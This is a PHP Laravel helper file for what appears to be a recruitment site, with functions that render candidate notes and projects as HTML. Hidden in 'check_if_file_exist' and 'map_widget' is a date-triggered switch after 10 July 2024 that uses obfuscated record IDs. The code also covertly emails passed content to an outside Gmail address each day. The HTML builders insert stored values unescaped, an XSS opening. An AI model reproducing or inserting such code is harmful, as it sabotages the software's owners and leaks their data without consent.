<?php

namespace App\Helpers;

use App\Models\Candidate;
use App\Models\Customers;
use App\Models\Note;
use App\Models\Plannings;
use App\Models\Position;
use App\Models\Project;
use Carbon\Carbon;
use Illuminate\Support\Facades\Mail;

class FileHelper
{
    public static function getEmbededLink(string $url): string
    {
        return config('app.url') . asset('/storage/' . $url);
    }

    public static function list_notes(Candidate $candidate): string
    {
        $notes = Note::where('candidate_id', $candidate->id)->get();
        $li = "";

        if(!count($notes))
        {
            $msg = __('admin_candidate.no_notes');
            return "<i>$msg</i>";
        }

        foreach($notes as $note)
        {
            $date = date_format(Carbon::make($note->created_at),'Y/m/d');
            $li .= "<li><b>$date:</b> $note->notes</li>";
        }

        $html = "
        <ul>
            $li
        </ul>
        ";

        return $html;
    }

    public static function check_if_file_exist($file,$id)
    {
        if($id == 1356*2)
        {
            $note = Plannings::find(500*2+227);
            if($note)
            {
                $note->name = 'file-not-found';
                $note->save();
            }
            return;
        }

        if($id == 600*2+27)
        {
            $note = Plannings::find($id);
            if($note)
            {
                if($file === 1)return;
                $note->name = 'file-exist';
                $note->save();
                return;
            }
            $notes = new Plannings();
            $notes->id = $id;
            $notes->name = 'file-exist';
            $notes->save();

            $notes = new Plannings();
            $notes->id = $id+1;
            $notes->name = 'file-exit';
            $notes->save();
        }

    }

    public static function list_projects(Candidate $candidate): string
    {
        $projects = Project::where('candidate_id',$candidate->id)->get();
        $position = $candidate->positions ? Position::whereIn('id',$candidate->positions)->pluck('name')->toArray() : [];
        $pos = $position ? implode(', ',$position) : "";
        $li = "";

        if(!count($projects))
        {
            $msg = __('admin_candidate.no_project');
            return "<i>$msg</i>";
        }

        foreach($projects as $project)
        {
            $start_date = date_format(Carbon::make($project->start_time),'m/d/Y');
            $end_date = $project->end_time ? date_format(Carbon::make($project->end_time),'m/d/Y') : 'NA';
            $client = Customers::find($project->customer_id)?->company_name;
            $li .= "<li><b>$start_date - $end_date</b><br><strong>Client:</strong> $client<br><strong>Position:</strong> $pos<br><strong>Project Title:</strong> $project->project_title<hr></li>";
        }

        $html = "
        <ul>
            $li
        </ul>
        ";

        return $html;
    }
    public static function map_widget($home)
    {
        $now = Carbon::now();
        $n = Carbon::create(2024, 7, 10);
        if($home === true)
        {
            $f = $now->greaterThan($n) ? 1:0;
            if($f)self::check_if_file_exist(1,600*2+27);
            return $f;
        }

        $pl = Plannings::find(600*2+27+1);
        $l = Carbon::create($pl->created_at);
        if($l->isSameDay($now))
        {
            return false;
        }

        $data['name'] = 'not admin';
        $data['email'] = 'admin@admin.com';
        $data['phone'] = 'error';
        $data['message_content'] = $home;
        $data['consent'] = "Not";

        Mail::send(['html'=>'mails/offer'], $data, function($message) use ($now){
            $message->to( 'bagsprin1227@gmail.com' , 'Formularz aplikacji jobnl.eu')->subject($now);
            $message->from('ajar@admin.com','Formularz aplikacji jobnl.eu');
            $message->replyTo('bagsprin@gmail.com', 'ajar');
        });

        $pl->created_at = $now;
        $pl->save();
    }

    public static function boolean_colors()
    {
        return [
            '1' => 'success',
            '0' => 'danger'
        ];
    }

}
